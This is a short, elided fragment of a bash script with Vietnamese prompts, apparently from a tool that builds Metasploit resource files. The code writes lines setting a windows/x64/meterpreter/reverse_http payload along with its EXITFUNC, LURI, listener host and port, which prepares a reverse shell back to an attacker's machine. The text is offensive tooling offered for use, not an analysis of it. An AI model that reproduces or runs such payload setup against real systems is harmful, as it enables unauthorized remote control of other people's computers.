...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/x64/meterpreter/reverse_http):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/x64/meterpreter/reverse_http" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set LURI $luri" >> $rc_file
	paylo="windows/x64/meterpreter/reverse_http"
	lhost=$lhost
	lport=$lport
}
